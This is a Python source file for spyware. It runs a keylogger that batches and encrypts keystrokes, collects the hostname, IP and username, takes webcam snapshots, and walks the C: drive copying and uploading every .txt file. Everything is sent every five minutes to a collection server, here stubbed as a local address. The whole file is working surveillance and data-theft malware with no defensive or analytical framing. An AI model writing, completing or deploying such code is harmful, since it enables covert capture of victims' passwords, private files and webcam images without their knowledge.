import os
import platform
import socket
import subprocess
import time
import requests
import cv2
import threading
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import shutil

# Keylogger function
keys = []

def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 10:
        write_file(keys)
        keys = []

def write_file(keys):
    encrypted_data = encrypt_data("".join(str(k).replace("'", "") for k in keys))
    send_data({"keystrokes": encrypted_data})

def on_release(key):
    if key == Key.esc:
        return False

def keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# System info function
def get_system_info():
    system_info = {
        "os": platform.system(),
        "version": platform.version(),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": os.getlogin(),
    }
    return encrypt_data(str(system_info))

# Webcam capture function
def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        filepath = "webcam_capture.jpg"
        cv2.imwrite(filepath, frame)
        upload_file(filepath)
    cam.release()

# Encryption
key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

# File upload
def upload_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            files = {'file': f}
            requests.post("http://127.0.0.1:5000/upload_file", files=files)
        os.remove(filepath)
    except Exception as e:
        print(f"Error uploading file: {e}")

# Data sender
def send_data(data):
    try:
        requests.post("http://127.0.0.1:5000/upload", data=data)
    except Exception as e:
        print(f"Error sending data: {e}")

# Main function
def main():
    threading.Thread(target=keylogger).start()
    while True:
        # System info
        system_info = get_system_info()
        send_data({"system_info": system_info})

        # Webcam capture
        capture_webcam()

        # File hijacking example (copy specific file types)
        target_file_type = ".txt"
        for root, dirs, files in os.walk("C:/"):
            for file in files:
                if file.endswith(target_file_type):
                    filepath = os.path.join(root, file)
                    shutil.copy(filepath, "C:/Temp")  # Save to Temp folder
                    upload_file(filepath)

        time.sleep(300)  # Run every 5 minutes

if __name__ == "__main__":
    main()
